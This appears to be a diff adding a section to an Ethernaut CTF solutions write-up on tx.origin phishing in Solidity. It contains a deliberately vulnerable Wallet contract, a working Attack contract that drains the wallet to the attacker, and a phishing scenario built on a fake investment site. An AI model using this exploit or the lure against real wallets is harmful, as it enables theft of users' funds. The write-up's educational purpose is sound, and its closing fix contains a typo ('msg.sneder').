@@ -37,3 +37,53 @@ See [Attack.sol](https://github.com/timou0911/Ethernat-Solution-and-Explanation
 
 ## Fhishing through `tx.origin`
 
+Let’s say we have a contract called Wallet and Bob staked his ether inside it. Here’s the code:
+```Solidity
+contract Wallet {
+    address public owner;
+
+    constructor() payable {
+        owner = msg.sender;
+    }
+
+    function transfer(address payable _to, uint _amount) public {
+        require(owner == tx.origin, "Not owner");
+        (bool sent, ) = _to.call{value: _amount}("");
+        require(sent, "Tx failed");
+    }
+}
+```
+
+And the code below is a malicious contract:
+
+```Solidity
+contract Attack {
+    address payable public owner;
+    Wallet wallet;
+
+    constructor(Wallet _wallet) {
+        wallet = Wallet(_wallet); // the target address
+        owner = payable(msg.sender); // the attacker
+    }
+
+    function attack() public { // 
+        wallet.transfer(owner, address(wallet).balance);
+    }
+}
+```
+
+Here’s one possible hacking process:
+
+1. First of all, the attacker discovered that Bob is fascinated by crypto investment.
+
+2. The attacker sends a fake crypto-investing teaching website to Bob via email.
+
+3. Since it is common to connect a wallet to such websites, Bob may be lured to purchase a lesson by signing the transaction through his wallet.
+
+4. However, the transaction he signed didn’t buy him the online lesson; the transaction calls `attack` in the malicious contract, and then `attack` calls `transfer` in the Wallet contract, transferring all of Bob’s ethers to the attacker’s wallet.
+
+5. Actually, Bob does get a lesson now.
+
+Attackers may utilize soical engineering to incresase the success rate. Also, they can create multiple contracts to hide their real purpose.
+
+To protect your contract, it’s not suitable to check permission through `tx.origin`. A better practice is to use `msg.sneder`.
